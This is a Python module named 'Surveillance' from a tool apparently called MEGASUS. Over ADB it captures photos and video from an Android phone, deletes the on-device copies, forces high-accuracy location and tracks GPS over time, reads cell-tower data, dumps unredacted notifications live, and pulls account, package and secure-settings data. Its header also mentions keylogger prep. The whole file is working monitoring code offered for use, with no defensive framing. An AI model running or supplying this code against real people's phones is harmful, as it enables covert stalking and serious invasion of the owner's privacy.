"""
MEGASUS Module: SURVEILLANCE - Camera, GPS, Notifications, Keylogger prep
Advanced monitoring capabilities
"""
from core.engine import DeviceManager, ADB, _run_shell, _run, log_command
import os
import time

MODULE_NAME = "Surveillance"
MODULE_ICON = "👁️"


def take_photo(device_manager, camera="back", output_dir=".", serial=None):
    """Trigger camera and pull photo"""
    target = serial or device_manager.get_active()
    if not target:
        return False, "No device"

    ts = time.strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/megasus_photo_{ts}.jpg"
    local_file = os.path.join(output_dir, f"megasus_photo_{ts}.jpg")

    # Trigger camera via intent
    cam_id = "0" if camera == "back" else "1"
    _run_shell(
        f"am start -a android.intent.action.STILL_IMAGE_CAMERA "
        f"--ei android.intent.extras.CAMERA_FACING {cam_id}",
        device=target, timeout=10
    )

    # Wait and try to find latest photo
    time.sleep(3)

    # Get latest DCIM photo
    stdout, _, _ = _run_shell(
        f"ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1 || "
        f"ls -t /sdcard/DCIM/*.jpg 2>/dev/null | head -1 || "
        f"ls -t /sdcard/Pictures/*.jpg 2>/dev/null | head -1",
        device=target, timeout=10
    )

    latest = stdout.strip()
    if latest:
        _run(["-s", target, "pull", latest, local_file], timeout=30)
        if os.path.exists(local_file) and os.path.getsize(local_file) > 1000:
            return True, f"Photo saved: {os.path.abspath(local_file)}"

    return False, "Could not capture photo via intent. Try screen capture method instead."


def record_video_front(device_manager, duration=10, output_dir=".", serial=None):
    """Record video from front camera"""
    target = serial or device_manager.get_active()
    if not target:
        return False, "No device"

    ts = time.strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/megasus_video_{ts}.mp4"
    local_file = os.path.join(output_dir, f"megasus_video_{ts}.mp4")

    # Open video camera
    _run_shell("am start -a android.intent.action.VIDEO_CAMERA", device=target, timeout=10)
    time.sleep(3)

    # Use screenrecord as alternative (records screen while camera app is open)
    print(f"[*] Recording for {duration}s via screenrecord...")
    _run_shell(f"screenrecord --time-limit {duration} '{remote_file}'", device=target, timeout=duration + 10)

    # Pull
    _run(["-s", target, "pull", remote_file, local_file], timeout=60)
    _run_shell(f"rm -f '{remote_file}'", device=target)

    if os.path.exists(local_file):
        return True, f"Video saved: {os.path.abspath(local_file)}"
    return False, "Video capture failed"


def get_gps_location(device_manager, serial=None):
    """Get GPS location via location services"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    # Try to get last known location
    stdout, _, _ = _run_shell(
        "dumpsys location | grep -A5 'last known location' | head -20",
        device=target, timeout=10
    )

    if not stdout.strip():
        # Alternative method
        stdout, _, _ = _run_shell(
            "settings get secure location_providers_allowed",
            device=target, timeout=10
        )
        providers = stdout.strip()

        # Try to trigger a location update
        _run_shell(
            "am broadcast -a com.google.android.gms.location.ALARM_WAKEUP",
            device=target, timeout=5
        )

        stdout, _, _ = _run_shell(
            "dumpsys location | grep 'Location[' | head -10",
            device=target, timeout=10
        )

    return stdout.strip(), "OK"


def get_cell_location(device_manager, serial=None):
    """Get cell tower location info"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    stdout, _, _ = _run_shell(
        "dumpsys telephony.registry | grep -E 'mCellLocation|CellIdentity' | head -10",
        device=target, timeout=10
    )
    return stdout.strip(), "OK"


def get_active_notifications(device_manager, serial=None):
    """Get active notifications"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    stdout, _, _ = _run_shell(
        "dumpsys notification --noredact 2>/dev/null | grep -A5 'NotificationRecord' | head -100",
        device=target, timeout=10
    )
    if not stdout.strip():
        stdout, _, _ = _run_shell(
            "dumpsys notification | head -50",
            device=target, timeout=10
        )
    return stdout.strip(), "OK"


def monitor_notifications(device_manager, serial=None, duration=30):
    """Monitor notifications appearing in real-time"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    print(f"[*] Monitoring notifications for {duration}s...")
    print("[*] Press Ctrl+C to stop early")

    start = time.time()
    notifications = []
    known = set()

    try:
        while time.time() - start < duration:
            stdout, _, _ = _run_shell(
                "dumpsys notification | grep 'NotificationRecord' | head -20",
                device=target, timeout=10
            )
            for line in stdout.splitlines():
                line = line.strip()
                if line and line not in known:
                    known.add(line)
                    ts = time.strftime("%H:%M:%S")
                    notifications.append(f"[{ts}] {line}")
                    print(f"  [{ts}] NEW: {line[:100]}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")

    return notifications, f"Collected {len(notifications)} unique notifications"


def get_location_services_status(device_manager, serial=None):
    """Check if GPS/Network location is enabled"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    results = {}
    stdout, _, _ = _run_shell("settings get secure location_mode", device=target)
    mode_map = {"0": "OFF", "1": "Sensors only (GPS)", "2": "Battery saving (network)", "3": "High accuracy (GPS+network)"}
    results["location_mode"] = mode_map.get(stdout.strip(), f"Unknown ({stdout.strip()})")

    stdout, _, _ = _run_shell("settings get secure location_providers_allowed", device=target)
    results["allowed_providers"] = stdout.strip()

    stdout, _, _ = _run_shell("dumpsys location | grep 'Provider' | head -10", device=target)
    results["providers"] = stdout.strip() or "N/A"

    return results, "OK"


def start_location_tracking(device_manager, interval=10, duration=60, output_file=None, serial=None):
    """Track GPS location over time"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    print(f"[*] Tracking location every {interval}s for {duration}s...")
    locations = []
    start = time.time()

    # Enable high accuracy location
    _run_shell("settings put secure location_mode 3", device=target)

    try:
        while time.time() - start < duration:
            stdout, _, _ = _run_shell(
                "dumpsys location | grep 'Location\\[' | head -3",
                device=target, timeout=10
            )
            ts = time.strftime("%Y-%m-%d %H:%M:%S")
            entry = {"time": ts, "data": stdout.strip()}
            locations.append(entry)

            if stdout.strip():
                print(f"  [{ts}] {stdout.strip()[:120]}")
            else:
                print(f"  [{ts}] Waiting for fix...")

            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Tracking stopped")

    if output_file and locations:
        import json
        with open(output_file, "w") as f:
            json.dump(locations, f, indent=2)

    return locations, f"Collected {len(locations)} location samples"


def get_sensor_list(device_manager, serial=None):
    """List device sensors"""
    target = serial or device_manager.get_active()
    if not target:
        return None, "No device"

    stdout, _, _ = _run_shell(
        "dumpsys sensorservice | grep 'Sensor ' | head -30",
        device=target, timeout=10
    )
    return stdout.strip(), "OK"


def dump_device_info_full(device_manager, output_dir=".", serial=None):
    """Dump comprehensive device info to files"""
    target = serial or device_manager.get_active()
    if not target:
        return False, "No device"

    os.makedirs(output_dir, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    files_created = []

    dumps = {
        "build_prop.txt": "cat /system/build.prop 2>/dev/null",
        "cpu_info.txt": "cat /proc/cpuinfo",
        "mem_info.txt": "cat /proc/meminfo",
        "disk_usage.txt": "df -h",
        "mounts.txt": "mount",
        "processes.txt": "ps -A -o PID,USER,NAME,CPU,MEM",
        "network.txt": "ip addr show",
        "wifi.txt": "dumpsys wifi 2>/dev/null | head -100",
        "battery.txt": "dumpsys battery",
        "accounts.txt": "dumpsys account 2>/dev/null | head -50",
        "packages.txt": "pm list packages -f",
        "services.txt": "dumpsys activity services 2>/dev/null | head -100",
        "settings_secure.txt": "settings list secure 2>/dev/null",
        "settings_global.txt": "settings list global 2>/dev/null",
        "settings_system.txt": "settings list system 2>/dev/null",
        "prop.txt": "getprop",
    }

    for fname, cmd in dumps.items():
        stdout, _, _ = _run_shell(cmd, device=target, timeout=15)
        fpath = os.path.join(output_dir, f"megasus_dump_{ts}_{fname}")
        with open(fpath, "w", encoding="utf-8") as f:
            f.write(stdout)
        files_created.append(fpath)

    return files_created, f"Dumped {len(files_created)} files to {output_dir}"
